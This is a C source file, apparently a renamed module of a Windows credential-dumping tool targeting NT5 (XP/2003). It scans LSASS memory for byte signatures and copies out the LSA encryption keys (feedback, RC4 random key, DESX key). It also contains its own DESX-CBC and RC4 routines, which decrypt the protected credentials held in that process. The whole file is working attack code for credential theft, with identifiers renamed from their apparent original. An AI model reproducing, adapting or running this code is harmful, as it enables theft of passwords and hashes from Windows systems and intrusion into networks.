#include "my_modules_nt5.h"


NTSTATUS my_m_modules_nt5_KeyInit = STATUS_NOT_FOUND;
const PLSA_PROTECT_MEMORY my_m_modules_nt5_pLProtectMemory = my_m_modules_nt5_LProtectMemory, my_m_modules_nt5_pLUnprotectMemory = my_m_modules_nt5_LUnprotectMemory;
BYTE g_Feedback[8], g_pRandomKey[256];
SYMCRYPT_NT5_DESX_EXPANDED_KEY g_pDESXKey;
NTSTATUS my_m_modules_nt5_init()
{
	if(!NT_SUCCESS(my_m_modules_nt5_KeyInit))
		my_m_modules_nt5_KeyInit = my_m_modules_nt5_LInitializeProtectedMemory();
	return my_m_modules_nt5_KeyInit;
}

NTSTATUS my_m_modules_nt5_clean()
{
	if(NT_SUCCESS(my_m_modules_nt5_KeyInit))
		my_m_modules_nt5_LInitializeProtectedMemory();
	return STATUS_SUCCESS;
}

NTSTATUS my_m_modules_nt5_LInitializeProtectedMemory()
{
	RtlZeroMemory(g_Feedback, sizeof(g_Feedback));
	RtlZeroMemory(g_pRandomKey, sizeof(g_pRandomKey));
	RtlZeroMemory(&g_pDESXKey, sizeof(g_pDESXKey));
	return STATUS_SUCCESS;
}

BOOL my_m_modules_nt5_isOld(DWORD osBuildNumber, DWORD moduleTimeStamp)
{
	BOOL status = FALSE;
	if(osBuildNumber == PW_M_WIN_BUILD_2K3)
	{
		if(moduleTimeStamp == 0x49901640) 
			status = TRUE;
		else if(moduleTimeStamp <= 0x45d70a62) 
			status = TRUE;
	}
	return status;
}

NTSTATUS my_m_modules_nt5_acquireKeys(PMY_M_MODULES_CONTEXT cLs, PPW_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsLSrvModule)
{
#if defined(_M_X64)
    BYTE PTRN_WNT5_LInitializeProtectedMemory_KEY[] = { 0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3 };
    LONG OFFS_WNT5_g_Feedback = -67;
    LONG OFFS_WNT5_g_pRandomKey = -17;
    LONG OFFS_WNT5_g_pDESXKey = -35;
#elif defined(_M_IX86)
    BYTE PTRN_WNT5_LInitializeProtectedMemory_KEY[] = { 0x05, 0x90, 0x00, 0x00, 0x00, 0x6a, 0x18, 0x50, 0xa3 };
    LONG OFFS_WNT5_g_Feedback = 25;
    LONG OFFS_WNT5_g_pRandomKey = 9;
    LONG OFFS_WNT5_g_pDESXKey = -4;
    LONG OFFS_WNT5_old_g_Feedback = 29;
#endif
	NTSTATUS status = STATUS_NOT_FOUND;
	PW_M_MEMORY_ADDRESS aLsMemory = {NULL, cLs->hLsMem}, aLocalMemory = {PTRN_WNT5_LInitializeProtectedMemory_KEY, &PW_M_MEMORY_GLOBAL_OWN_HANDLE};
	PW_M_MEMORY_SEARCH sMemory = {{{lsLSrvModule->DllBase.address, cLs->hLsMem}, lsLSrvModule->SizeOfImage}, NULL};
	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LInitializeProtectedMemory_KEY);
	LONG offFeedBack = OFFS_WNT5_g_Feedback;
#if defined(_M_X64)
	LONG offset64;
#elif defined(_M_IX86)
	if(my_m_modules_nt5_isOld(cLs->osContext.BuildNumber, lsLSrvModule->TimeDateStamp))
		offFeedBack = OFFS_WNT5_old_g_Feedback;
#endif
	
	if(pw_m_memory_search(&aLocalMemory, sizeOfSearch, &sMemory, FALSE))
	{
		aLsMemory.address = (PBYTE) sMemory.result + offFeedBack;
#if defined(_M_X64)
		aLocalMemory.address = &offset64;
		if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(LONG)))
		{
			aLsMemory.address = (PBYTE) sMemory.result + offFeedBack + sizeof(LONG) + offset64;
#elif defined(_M_IX86)
		aLocalMemory.address = &aLsMemory.address;
		if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(PVOID)))
		{
#endif
			aLocalMemory.address = g_Feedback;
			if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, 8))
			{
				aLsMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey;
				if(my_m_modules_nt5_acquireKey(&aLsMemory, (PBYTE) &g_pDESXKey, sizeof(g_pDESXKey)))
				{
					aLsMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey;
					if(my_m_modules_nt5_acquireKey(&aLsMemory, g_pRandomKey, sizeof(g_pRandomKey)))
						status = STATUS_SUCCESS;
				}
			}
		}
	}
	return status;
}

BOOL my_m_modules_nt5_acquireKey(PPW_M_MEMORY_ADDRESS aLsMemory, PBYTE Key, SIZE_T taille)
{
	BOOL status = FALSE;
	PW_M_MEMORY_ADDRESS aLocalMemory = {&aLsMemory->address, &PW_M_MEMORY_GLOBAL_OWN_HANDLE};
#if defined(_M_X64)
	LONG offset64;
	aLocalMemory.address = &offset64;
	if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(LONG)))
	{
		aLsMemory->address = (PBYTE) aLsMemory->address + sizeof(LONG) + offset64;
		aLocalMemory.address = &aLsMemory->address;
#elif defined(_M_IX86)
	if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(PVOID)))
	{
#endif
		if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(PVOID)))
		{
			aLocalMemory.address = Key;
			status = pw_m_memory_copy(&aLocalMemory, aLsMemory, taille);
		}
	}
	return status;
}

VOID WINAPI my_m_modules_nt5_LProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
	my_m_modules_nt5_LEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);
}

VOID WINAPI my_m_modules_nt5_LUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
	my_m_modules_nt5_LEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
}

NTSTATUS my_m_modules_nt5_LEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
	NTSTATUS status = STATUS_SUCCESS;
	SYMCRYPT_RC4_STATE rc4state;
	BYTE ChainingValue[8];
	PCRYPT_ENCRYPT cryptFunc;
	if(cbMemory % 8)
	{
		if(SymCryptRc4Init2(&rc4state, g_pRandomKey, sizeof(g_pRandomKey)))
			SymCryptRc4Crypt2(&rc4state, pMemory, pMemory, cbMemory);
		else status = STATUS_CRYPTO_SYSTEM_INVALID;
	}
	else
	{
		cryptFunc = Encrypt ? SymCryptDesxCbcEncrypt2 : SymCryptDesxCbcDecrypt2;
		RtlCopyMemory(ChainingValue, g_Feedback, 8);
		cryptFunc(&g_pDESXKey, ChainingValue, pMemory, pMemory, cbMemory);
	}
	return status;
}

const UINT32 SymCryptDesSpbox[8][64] = {
	0x02080800, 0x00080000, 0x02000002, 0x02080802, 0x02000000, 0x00080802, 0x00080002, 0x02000002, 0x00080802, 0x02080800, 0x02080000, 0x00000802, 0x02000802, 0x02000000, 0x00000000, 0x00080002,
	0x00080000, 0x00000002, 0x02000800, 0x00080800, 0x02080802, 0x02080000, 0x00000802, 0x02000800, 0x00000002, 0x00000800, 0x00080800, 0x02080002, 0x00000800, 0x02000802, 0x02080002, 0x00000000,
	0x00000000, 0x02080802, 0x02000800, 0x00080002, 0x02080800, 0x00080000, 0x00000802, 0x02000800, 0x02080002, 0x00000800, 0x00080800, 0x02000002, 0x00080802, 0x00000002, 0x02000002, 0x02080000,
	0x02080802, 0x00080800, 0x02080000, 0x02000802, 0x02000000, 0x00000802, 0x00080002, 0x00000000, 0x00080000, 0x02000000, 0x02000802, 0x02080800, 0x00000002, 0x02080002, 0x00000800, 0x00080802,
	0x40108010, 0x00000000, 0x00108000, 0x40100000, 0x40000010, 0x00008010, 0x40008000, 0x00108000, 0x00008000, 0x40100010, 0x00000010, 0x40008000, 0x00100010, 0x40108000, 0x40100000, 0x00000010,
	0x00100000, 0x40008010, 0x40100010, 0x00008000, 0x00108010, 0x40000000, 0x00000000, 0x00100010, 0x40008010, 0x00108010, 0x40108000, 0x40000010, 0x40000000, 0x00100000, 0x00008010, 0x40108010,
	0x00100010, 0x40108000, 0x40008000, 0x00108010, 0x40108010, 0x00100010, 0x40000010, 0x00000000, 0x40000000, 0x00008010, 0x00100000, 0x40100010, 0x00008000, 0x40000000, 0x00108010, 0x40008010,
	0x40108000, 0x00008000, 0x00000000, 0x40000010, 0x00000010, 0x40108010, 0x00108000, 0x40100000, 0x40100010, 0x00100000, 0x00008010, 0x40008000, 0x40008010, 0x00000010, 0x40100000, 0x00108000,
	0x04000001, 0x04040100, 0x00000100, 0x04000101, 0x00040001, 0x04000000, 0x04000101, 0x00040100, 0x04000100, 0x00040000, 0x04040000, 0x00000001, 0x04040101, 0x00000101, 0x00000001, 0x04040001,
	0x00000000, 0x00040001, 0x04040100, 0x00000100, 0x00000101, 0x04040101, 0x00040000, 0x04000001, 0x04040001, 0x04000100, 0x00040101, 0x04040000, 0x00040100, 0x00000000, 0x04000000, 0x00040101,
	0x04040100, 0x00000100, 0x00000001, 0x00040000, 0x00000101, 0x00040001, 0x04040000, 0x04000101, 0x00000000, 0x04040100, 0x00040100, 0x04040001, 0x00040001, 0x04000000, 0x04040101, 0x00000001,
	0x00040101, 0x04000001, 0x04000000, 0x04040101, 0x00040000, 0x04000100, 0x04000101, 0x00040100, 0x04000100, 0x00000000, 0x04040001, 0x00000101, 0x04000001, 0x00040101, 0x00000100, 0x04040000,
	0x00401008, 0x10001000, 0x00000008, 0x10401008, 0x00000000, 0x10400000, 0x10001008, 0x00400008, 0x10401000, 0x10000008, 0x10000000, 0x00001008, 0x10000008, 0x00401008, 0x00400000, 0x10000000,
	0x10400008, 0x00401000, 0x00001000, 0x00000008, 0x00401000, 0x10001008, 0x10400000, 0x00001000, 0x00001008, 0x00000000, 0x00400008, 0x10401000, 0x10001000, 0x10400008, 0x10401008, 0x00400000,
	0x10400008, 0x00001008, 0x00400000, 0x10000008, 0x00401000, 0x10001000, 0x00000008, 0x10400000, 0x10001008, 0x00000000, 0x00001000, 0x00400008, 0x00000000, 0x10400008, 0x10401000, 0x00001000,
	0x10000000, 0x10401008, 0x00401008, 0x00400000, 0x10401008, 0x00000008, 0x10001000, 0x00401008, 0x00400008, 0x00401000, 0x10400000, 0x10001008, 0x00001008, 0x10000000, 0x10000008, 0x10401000,
	0x08000000, 0x00010000, 0x00000400, 0x08010420, 0x08010020, 0x08000400, 0x00010420, 0x08010000, 0x00010000, 0x00000020, 0x08000020, 0x00010400, 0x08000420, 0x08010020, 0x08010400, 0x00000000,
	0x00010400, 0x08000000, 0x00010020, 0x00000420, 0x08000400, 0x00010420, 0x00000000, 0x08000020, 0x00000020, 0x08000420, 0x08010420, 0x00010020, 0x08010000, 0x00000400, 0x00000420, 0x08010400,
	0x08010400, 0x08000420, 0x00010020, 0x08010000, 0x00010000, 0x00000020, 0x08000020, 0x08000400, 0x08000000, 0x00010400, 0x08010420, 0x00000000, 0x00010420, 0x08000000, 0x00000400, 0x00010020,
	0x08000420, 0x00000400, 0x00000000, 0x08010420, 0x08010020, 0x08010400, 0x00000420, 0x00010000, 0x00010400, 0x08010020, 0x08000400, 0x00000420, 0x00000020, 0x00010420, 0x08010000, 0x08000020,
	0x80000040, 0x00200040, 0x00000000, 0x80202000, 0x00200040, 0x00002000, 0x80002040, 0x00200000, 0x00002040, 0x80202040, 0x00202000, 0x80000000, 0x80002000, 0x80000040, 0x80200000, 0x00202040,
	0x00200000, 0x80002040, 0x80200040, 0x00000000, 0x00002000, 0x00000040, 0x80202000, 0x80200040, 0x80202040, 0x80200000, 0x80000000, 0x00002040, 0x00000040, 0x00202000, 0x00202040, 0x80002000,
	0x00002040, 0x80000000, 0x80002000, 0x00202040, 0x80202000, 0x00200040, 0x00000000, 0x80002000, 0x80000000, 0x00002000, 0x80200040, 0x00200000, 0x00200040, 0x80202040, 0x00202000, 0x00000040,
	0x80202040, 0x00202000, 0x00200000, 0x80002040, 0x80000040, 0x80200000, 0x00202040, 0x00000000, 0x00002000, 0x80000040, 0x80002040, 0x80202000, 0x80200000, 0x00002040, 0x00000040, 0x80200040,
	0x00004000, 0x00000200, 0x01000200, 0x01000004, 0x01004204, 0x00004004, 0x00004200, 0x00000000, 0x01000000, 0x01000204, 0x00000204, 0x01004000, 0x00000004, 0x01004200, 0x01004000, 0x00000204,
	0x01000204, 0x00004000, 0x00004004, 0x01004204, 0x00000000, 0x01000200, 0x01000004, 0x00004200, 0x01004004, 0x00004204, 0x01004200, 0x00000004, 0x00004204, 0x01004004, 0x00000200, 0x01000000,
	0x00004204, 0x01004000, 0x01004004, 0x00000204, 0x00004000, 0x00000200, 0x01000000, 0x01004004, 0x01000204, 0x00004204, 0x00004200, 0x00000000, 0x00000200, 0x01000004, 0x00000004, 0x01000200,
	0x00000000, 0x01000204, 0x01000200, 0x00004200, 0x00000204, 0x00004000, 0x01004204, 0x01000000, 0x01004200, 0x00000004, 0x00004004, 0x01004204, 0x01000004, 0x01004200, 0x01004000, 0x00004004,
	0x20800080, 0x20820000, 0x00020080, 0x00000000, 0x20020000, 0x00800080, 0x20800000, 0x20820080, 0x00000080, 0x20000000, 0x00820000, 0x00020080, 0x00820080, 0x20020080, 0x20000080, 0x20800000,
	0x00020000, 0x00820080, 0x00800080, 0x20020000, 0x20820080, 0x20000080, 0x00000000, 0x00820000, 0x20000000, 0x00800000, 0x20020080, 0x20800080, 0x00800000, 0x00020000, 0x20820000, 0x00000080,
	0x00800000, 0x00020000, 0x20000080, 0x20820080, 0x00020080, 0x20000000, 0x00000000, 0x00820000, 0x20800080, 0x20020080, 0x20020000, 0x00800080, 0x20820000, 0x00000080, 0x00800080, 0x20020000,
	0x20820080, 0x00800000, 0x20800000, 0x20000080, 0x00820000, 0x00020080, 0x20020080, 0x20800000, 0x00000080, 0x20820000, 0x00820080, 0x00000000, 0x20000000, 0x20800080, 0x00020000, 0x00820080,
};

VOID SymCryptDesGenCrypt2(PCSYMCRYPT_NT5_DES_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst, BOOL Encrypt)
{
	UINT32 L = *(UINT32 *) (pbSrc + 4), R = *(UINT32 *) (pbSrc + 0), Ta, Tb;
	int r;

	R = ROL32(R, 4);
	Ta = (L ^ R) & 0xf0f0f0f0;
	L ^= Ta;
	R ^= Ta;
	L = ROL32(L, 20);
	Ta = (L ^ R) & 0xfff0000f;
	L ^= Ta;
	R ^= Ta;
	L = ROL32(L, 14);
	Ta = (L ^ R) & 0x33333333;
	L ^= Ta;
	R ^= Ta;
	R = ROL32(R, 22);
	Ta = (L ^ R) & 0x03fc03fc;
	L ^= Ta;
	R ^= Ta;
	R = ROL32(R, 9);
	Ta = (L ^ R) & 0xaaaaaaaa;
	L ^= Ta;
	R ^= Ta;
	L = ROL32(L, 1);

	if(Encrypt)
	{
		for(r = 0; r < 16; r += 2)
		{
			F(L, R, pExpandedKey->roundKey[r  ]);
			F(R, L, pExpandedKey->roundKey[r+1]);
		}
	}
	else
	{
		for(r = 14; r >= 0 ; r -= 2)
		{
			F(L, R, pExpandedKey->roundKey[r+1]);
			F(R, L, pExpandedKey->roundKey[r]);
		}
	}

	R = ROR32(R, 1);
	Ta = (L ^ R) & 0xaaaaaaaa;
	L ^= Ta;
	R ^= Ta;
	L = ROR32(L, 9);
	Ta = (L ^ R) & 0x03fc03fc;
	L ^= Ta;
	R ^= Ta;
	L = ROR32(L, 22);
	Ta = (L ^ R) & 0x33333333;
	L ^= Ta;
	R ^= Ta;
	R = ROR32(R, 14);
	Ta = (L ^ R) & 0xfff0000f;
	L ^= Ta;
	R ^= Ta;
	R = ROR32(R, 20);
	Ta = (L ^ R) & 0xf0f0f0f0;
	L ^= Ta;
	R ^= Ta;
	L = ROR32(L, 4);
	*(UINT32 *) (pbDst + 0) = L;
	*(UINT32 *) (pbDst + 4) = R;
}

VOID SymCryptDesxDecrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst)
{
	*(PULONGLONG) pbDst = *(PULONGLONG) pbSrc ^ *(PULONGLONG) pExpandedKey->outputWhitening;
	SymCryptDesGenCrypt2(&pExpandedKey->desKey, pbDst, pbDst, FALSE);
	*(PULONGLONG) pbDst ^= *(PULONGLONG) pExpandedKey->inputWhitening;
}

VOID SymCryptDesxEncrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst)
{
	*(PULONGLONG) pbDst = *(PULONGLONG) pbSrc ^ *(PULONGLONG) pExpandedKey->inputWhitening;
	SymCryptDesGenCrypt2(&pExpandedKey->desKey, pbDst, pbDst, TRUE);
	*(PULONGLONG) pbDst ^= *(PULONGLONG) pExpandedKey->outputWhitening;
}

VOID SymCryptDesxCbcDecrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData)
{
	LPCBYTE pbSrcEnd;
	BYTE buf[8];
	for(pbSrcEnd = &pbSrc[cbData & ~7]; pbSrc < pbSrcEnd; pbDst += 8, pbSrc += 8)
	{
		RtlCopyMemory(buf, pbSrc, 8);
		SymCryptDesxDecrypt2(pExpandedKey, pbSrc, pbDst);
		*(PULONGLONG) pbDst ^= *(PULONGLONG) pbChainingValue;
		RtlCopyMemory(pbChainingValue, buf, 8);
	}
}

VOID SymCryptDesxCbcEncrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData)
{
	LPCBYTE pbSrcEnd;
	for(pbSrcEnd = &pbSrc[cbData & ~7]; pbSrc < pbSrcEnd; pbSrc += 8, pbDst += 8)
	{
		*(PULONGLONG) pbChainingValue ^= *(PULONGLONG) pbSrc;
		SymCryptDesxEncrypt2(pExpandedKey, pbChainingValue, pbDst);
		RtlCopyMemory(pbChainingValue, pbDst, 8);
	}
}

BOOL SymCryptRc4Init2(PSYMCRYPT_RC4_STATE pState, LPCBYTE pbKey, SIZE_T cbKey)
{
	BOOL status = cbKey && (cbKey <= 256);
	SIZE_T i, j, keyIdx;
	BYTE T;

	if(status)
	{
		for(i = 0; i < 256; i++)
			pState->S[i] = (BYTE) i;
		j = 0;
		keyIdx = 0;
		for(i = 0; i < 256; i++)
		{
			T = pState->S[i];
			j = (j + T + pbKey[keyIdx]) & 0xff;
			pState->S[i] = pState->S[j];
			pState->S[j] = T;
			keyIdx++;
			if(keyIdx == cbKey)
				keyIdx = 0;
		}
		pState->i = 1;
		pState->j = 0;
	}
	return status;
}

VOID SymCryptRc4Crypt2(PSYMCRYPT_RC4_STATE pState, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData)
{
    BYTE Ti, Tj;
    LPCBYTE pbSrcEnd;
	for(pbSrcEnd = pbSrc + cbData; pbSrc < pbSrcEnd; pbSrc++, pbDst++)
	{
		Ti = pState->S[pState->i];
		pState->j = (pState->j + Ti );
		Tj = pState->S[pState->j];
		pState->S[pState->i] = Tj;
		pState->S[pState->j] = Ti;
		*pbDst = (*pbSrc ^ pState->S[(Ti + Tj) & 0xff]);
		pState->i = (pState->i + 1);
	}
}
